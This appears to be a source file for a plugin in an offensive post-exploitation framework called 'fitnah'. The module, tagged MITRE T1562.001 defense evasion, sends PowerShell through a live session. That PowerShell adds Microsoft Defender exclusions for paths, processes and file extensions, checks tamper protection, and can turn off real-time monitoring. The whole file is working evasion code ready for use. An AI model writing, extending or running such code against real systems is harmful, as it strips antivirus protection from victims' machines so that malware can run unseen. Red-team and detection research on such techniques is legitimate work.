"""defense_evasion/defender_exclude — Defender exclusions + disable real-time monitoring. MITRE T1562.001"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class DefenderExclude(BasePlugin):
    NAME        = "defender_exclude"
    DESCRIPTION = "Add path/process/ext exclusion; optionally disable real-time monitoring. Tamper protection warning."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.001"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("path",           str,  required=False, default="", help="Path exclusion"),
        Param("process",        str,  required=False, default="", help="Process name exclusion"),
        Param("extension",      str,  required=False, default="", help="File extension exclusion e.g. .ps1"),
        Param("remove",         bool, required=False, default=False, help="Remove exclusion instead"),
        Param("disable_rt",     bool, required=False, default=False,
              help="Also disable real-time monitoring (requires admin; fails if tamper protection on)"),
    )

    @mitre("T1562.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        path      = params.get("path", "")
        process   = params.get("process", "")
        ext       = params.get("extension", "")
        remove    = params.get("remove", False)
        disable_rt = params.get("disable_rt", False)

        parts = []
        verb = "Remove" if remove else "Add"
        if path:
            parts.append(f"{verb}-MpPreference -ExclusionPath '{path}' -EA SilentlyContinue")
        if process:
            parts.append(f"{verb}-MpPreference -ExclusionProcess '{process}' -EA SilentlyContinue")
        if ext:
            parts.append(f"{verb}-MpPreference -ExclusionExtension '{ext}' -EA SilentlyContinue")

        if not parts and not disable_rt:
            return ModuleResult.err("Provide at least one of: path, process, extension, or disable_rt=true")

        ps_parts = []
        # Check tamper protection status first
        ps_parts.append(
            "try {"
            "  $tp = (Get-MpComputerStatus -EA Stop).IsTamperProtected;"
            "  if ($tp) { Write-Output '[!] TAMPER PROTECTION IS ON — exclusions/RT-disable may fail silently' }"
            "  else { Write-Output '[*] Tamper protection: OFF' }"
            "} catch { Write-Output '[?] Could not read tamper protection status' };"
        )
        for p in parts:
            ps_parts.append(f"try {{ {p}; Write-Output '[+] Applied: {p[:60]}' }} catch {{ Write-Output \"[-] $_\" }};")

        if disable_rt:
            ps_parts.append(
                "try {"
                "  Set-MpPreference -DisableRealtimeMonitoring $true -EA Stop;"
                "  Write-Output '[+] Real-time monitoring DISABLED'"
                "} catch { Write-Output \"[-] Disable RT failed: $_\" };"
            )

        ps_parts.append(
            "try {"
            "  $st = Get-MpComputerStatus -EA Stop;"
            "  Write-Output \"Status: RT=$($st.RealTimeProtectionEnabled) OnAccess=$($st.OnAccessProtectionEnabled)\""
            "} catch {}"
        )

        r = ctx.ps("".join(ps_parts))
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
